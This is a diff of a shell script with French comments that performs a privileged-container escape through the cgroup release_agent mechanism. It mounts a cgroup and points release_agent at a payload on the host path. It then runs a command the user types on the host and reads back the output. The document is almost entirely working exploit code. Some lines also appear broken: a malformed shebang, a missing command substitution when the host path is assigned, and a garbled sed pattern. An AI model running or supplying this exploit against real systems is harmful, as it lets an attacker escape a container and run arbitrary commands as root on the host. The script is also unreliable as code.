@@ -1,24 +1,40 @@
+#!/bash/sh
+
 # Monte le contrôleur de cgroup RDMA et crée un cgroup enfant
 # Cette technique devrait fonctionner avec la majorité des contrôleurs cgroup
 # Si vous suivez et obtenez "mount : /tmp/cgrp : le périphérique spécial cgroup n'existe pas"
 # C'est parce que votre configuration n'a pas le contrôleur RDMA cgroup, essayez de changer rdma en mémoire pour résoudre le problème
+
 mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+
 # Active les notifications de cgroup sur la libération du cgroup "x"
+
 echo 1 > /tmp/cgrp/x/notify_on_release
+
 # Trouve le chemin du montage OverlayFS pour le conteneur
 # A moins que la configuration n'expose explicitement le point de montage du système de fichiers hôte
+
 # Voir https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
+
 host_path=sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab
+
 # Définit release_agent à /path/payload
+
 echo "$host_path/cmd" > /tmp/cgrp/release_agent
+
 # Création du payload
-echo "#!/bin/sh" > /cmd
+
+echo '#!/bin/sh' > /cmd
 read -p 'Commande à passer: ' commandvar
 echo "$commandvar > $host_path/output" >> /cmd
 chmod a+x /cmd
+
 # Exécute l'attaque en créant un processus qui se termine immédiatement dans le cgroup enfant "x"
 # En créant un processus /bin/sh et en écrivant son PID dans le fichier cgroup.procs dans le répertoire cgroup enfant "x"
 # Le script sur l'hôte sera exécuté après la sortie de /bin/sh
-sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
+
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+
 # Lire la sortie
+
 cat /output
